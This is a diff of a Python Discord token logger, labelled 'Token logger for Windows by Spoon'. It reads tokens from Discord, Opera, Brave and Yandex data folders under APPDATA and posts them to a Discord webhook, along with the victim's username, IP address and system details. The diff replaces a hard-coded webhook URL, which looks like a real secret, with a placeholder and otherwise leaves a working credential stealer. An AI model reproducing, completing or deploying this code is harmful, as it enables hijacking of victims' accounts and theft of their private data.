@@ -7,8 +7,7 @@ import getpass
 from os import remove
 from sys import argv
 
-WEBHOOK = "https://discord.com/api/webhooks/812572567059300362/376UJOXvz5qv9ikFVT0oX1aAB7fKiClyN9taqQIbf98P2slXZknio1zHPxGE4SAWVAZ1"
-
+WEBHOOK = "WEBHOOK URL HERE"
 appdatapath = os.getenv('APPDATA')
 paths = [
    appdatapath + '\\Discord',
@@ -18,9 +17,7 @@ paths = [
    appdatapath + '\\Opera Software\\Opera Stable',
    appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default']
-
 tknpaths = []
-
 def getTokens(path):
 	tokns = []
 	appdatapath = os.getenv('APPDATA')
@@ -39,8 +36,6 @@ def getTokens(path):
 			except:
 				pass
 	return tokns
-
-
 def SendTokens(tkns):
 	ip = "Unavailable"
 	try:
@@ -49,12 +44,10 @@ def SendTokens(tkns):
 		ip = "Unavailable"
 
 	content = f"```css\nPulled {len(tkns)} tokens from {getpass.getuser()}  ip: {ip}\n"
-
 	for tkn in tkns:
 		# content += '---------------------------------\n'
 		content += tkn + "\n"
 		content += '---------------------------------\n'
-
 	content += ("\n\n========================================System Information========================================")
 	uname = platform.uname()
 	content += (f"\nSystem: {uname.system}")
@@ -64,7 +57,6 @@ def SendTokens(tkns):
 	content += (f"\nMachine: {uname.machine}")
 	content += (f"\nProcessor: {uname.processor}\n\n")
 	content += datetime.datetime.now().strftime("%H:%M %p")
-
 	content += "```@everyone"
 	payload = {
 	"content" : content,
@@ -72,17 +64,11 @@ def SendTokens(tkns):
 	"username" : "Token logger for Windows by Spoon"
 	}
 	requests.post(WEBHOOK, data=payload)
-
-
-
 tksn = []
 for _dir in paths:
 	tksn.extend(getTokens(_dir))
-
-
 if len(tksn) < 1:
 	exit(0)
-
 for check in tksn:
 	check = str(check)
 	if check.startswith('\n'):
@@ -99,4 +85,3 @@ for check in tksn:
 			pass
 
 SendTokens(tksn)
-
